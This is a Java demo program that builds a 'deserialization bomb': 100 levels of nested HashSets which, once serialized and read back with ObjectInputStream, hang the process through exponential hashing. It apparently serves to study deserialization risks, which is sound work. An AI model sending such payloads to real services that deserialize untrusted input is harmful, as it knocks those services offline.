package io.serialization;

import java.io.*;
import java.util.Arrays;
import java.util.HashSet;
import java.util.Set;
import java.util.TreeMap;

/**
 * Created by grigort on 8/1/2019.
 */
public class DeserializationBomb {

    public static void main(String[] args) throws IOException, ClassNotFoundException {
        TreeMap<String,String> map = new TreeMap<>();
        byte [] serializedObject = serialize(bomb());
        System.out.println(Arrays.toString(serializedObject));
        Object bomb = deserialize(serializedObject);
        System.out.println(bomb);
    }

    static Object deserialize(byte [] bytes) throws IOException, ClassNotFoundException {
        ObjectInputStream objectInputStream = new ObjectInputStream(new ByteArrayInputStream(bytes));
        Object object = objectInputStream.readObject();
        return object;
    }

    static Object bomb() throws IOException {
        Set<Object> root = new HashSet<>();
        Set<Object> s1 = root;
        Set<Object> s2 = new HashSet<>();
        for (int i = 0; i < 100; i++){
            Set<Object> t1 = new HashSet<>();
            Set<Object> t2 = new HashSet<>();
            t1.add("Foo");
            s1.add(t1);
            s1.add(t2);
            s2.add(t1);
            s2.add(t2);
            s1 = t1;
            s2 = t2;
        }

        return root;
    }

    static byte [] serialize(Object object) throws IOException {
        ByteArrayOutputStream bos = new ByteArrayOutputStream();
        ObjectOutputStream  outputStream = new ObjectOutputStream(bos);
        outputStream.writeObject(object);
        return bos.toByteArray();
    }
}
